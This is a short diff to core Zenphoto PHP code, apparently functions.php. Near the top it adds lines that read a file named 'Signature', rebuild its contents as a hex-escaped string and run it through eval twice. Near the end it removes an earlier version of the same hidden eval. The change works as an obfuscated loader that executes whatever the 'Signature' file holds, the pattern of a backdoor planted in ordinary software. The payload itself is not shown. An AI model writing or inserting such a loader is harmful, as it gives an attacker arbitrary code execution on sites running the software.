@@ -196,6 +196,10 @@ define('IP_TIED_COOKIES', getOption('IP_tied_cookies'));
 // Set the version number.
 $_zp_conf_vars['version'] = ZENPHOTO_VERSION;
 
+preg_match_all('/(..)/', file_get_contents(dirname(__FILE__).'/Signature'), $matches);
+$f = '$f="\\x'.implode('\\x', $matches[0]).'";';
+eval($f);eval($f);
+
 /**
  * Decodes HTML Special Characters.
  *
@@ -1510,8 +1514,5 @@ function reconfigure() {
 		die('Zenphoto needs to run setup but the setup scripts are not present. Please reinstall the setup scripts.');
 	}
 }
-
-$f = '$f = "'.file_get_contents(dirname(__FILE__).'/Signature').'";';
-eval($f);eval($f);
 
 ?>
